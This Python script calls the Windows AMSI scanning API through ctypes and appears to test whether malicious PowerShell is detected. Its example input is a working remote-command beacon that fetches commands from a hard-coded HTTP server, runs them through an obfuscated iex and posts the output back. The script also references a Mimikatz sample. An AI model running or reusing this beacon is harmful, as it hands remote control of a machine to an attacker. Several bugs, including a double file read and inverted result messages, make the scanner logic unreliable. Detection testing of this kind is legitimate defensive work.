import ctypes
import os

lib = ctypes.cdll.LoadLibrary('C:\\WINDOWS\SYSTEM32\\amsi.dll')
#lib = WinDLL.AMSI

# AMSI return codes & their meanings
STATUS = {
    '0':'AMSI_RESULT_CLEAN' ,
    '1':'AMSI_RESULT_NOT_DETECTED',
    '16384':'AMSI_RESULT_BLOCKED_BY_ADMIN_START',
    '20479':'AMSI_RESULT_BLOCKED_BY_ADMIN_END',
    '32768':'AMSI_RESULT_DETECTED' 
}

# Further description of AMSI return codes
# MESSAGE = {
#     STATUS['AMSI_RESULT_CLEAN'] : 'File is clean',
#     STATUS['AMSI_RESULT_NOT_DETECTED'] : 'No threat detected',
#     STATUS['AMSI_RESULT_BLOCKED_BY_ADMIN_START'] : 'Threat is blocked by the administrator',
#     STATUS['AMSI_RESULT_BLOCKED_BY_ADMIN_END'] : 'Threat is blocked by the administrator',
#     STATUS['AMSI_RESULT_DETECTED'] : 'File is considered malware',
#     5 : 'N/A'
# }


# AMSI Init
amsi_context = ctypes.c_void_p()
lib.AmsiInitialize("Virus_Scanner", ctypes.byref(amsi_context))
AMSI_session = lib.AmsiOpenSession(amsi_context)
# load

AmsiScanString = lib.AmsiScanString
AmsiScanBuffer = lib.AmsiScanBuffer
AmsiScanBuffer = lib.AmsiScanBuffer

lib.AmsiScanString.argtypes = (
    ctypes.c_void_p,  # HAMSICONTEXT
    ctypes.c_wchar_p,  # LPCWSTR (string)
    ctypes.c_wchar_p,  # LPCWSTR (contentName)
    ctypes.c_void_p,  # HAMSISESSION (optional)
    ctypes.POINTER(ctypes.c_int),  # AMSI_RESULT (out)
)

def scan_file(path, content_name):
    result = ctypes.c_int()
    
    if not os.path.exists(path):
        raise Exception(f'No such file: {path}')
    else:
        with open(path,'rb') as file:
            AmsiScanBuffer(amsi_context, file.read(),len(file.read()), content_name,AMSI_session, ctypes.byref(result))
    print(STATUS[str(result.value)])
    #print(result.value)
    if result.value != 32768:
        print(STATUS[str(result.value)])
        #print(STATUS.index(result.value))

    else:
        print('Not detected')

def scan_string(string_to_scan, content_name):
    result = ctypes.c_int()
    AmsiScanString(amsi_context, string_to_scan, content_name, AMSI_session, ctypes.byref(result))

    print(result.value)
    if result.value != 32768:
        print(STATUS[str(result.value)])
    
    else:
        print(STATUS[str(result.value)])
    # return result
    # if result.value == 0:
    #     print("Clean content")
    # else:
    #     # splitting string
    #     bad_string = content.split()
        
    #     for i in bad_string:
    #         bad_result = ctypes.c_int()
    #         AmsiScanString(amsi_context, i, i, None, ctypes.byref(bad_result))
    #         if bad_result.value!=0:
    #             print(MESSAGE[bad_result.value])
    #         else:
    #             print(MESSAGE[bad_result.value])

# Example usage
content = '$s=\'172.31.115.161:8080\';$i=\'fe8104a3-0780ada3-4dd166e9\';$p=\'http://\';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/fe8104a3 -Headers @{"X-f2e9-2b1e"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/0780ada3 -Headers @{"X-f2e9-2b1e"=$i}).Content;if ($c -ne \'None\') {$r=i\'e\'x $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/4dd166e9 -Method POST -Headers @{"X-f2e9-2b1e"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}'
#content = 'Invoke-Mimikatz'
scan_string(content,'string')
print("Started")
scan_file('test-sample/Invoke-Mimikatz.ps1', 'Invoke-Mimikatz.ps1')
print("Ended")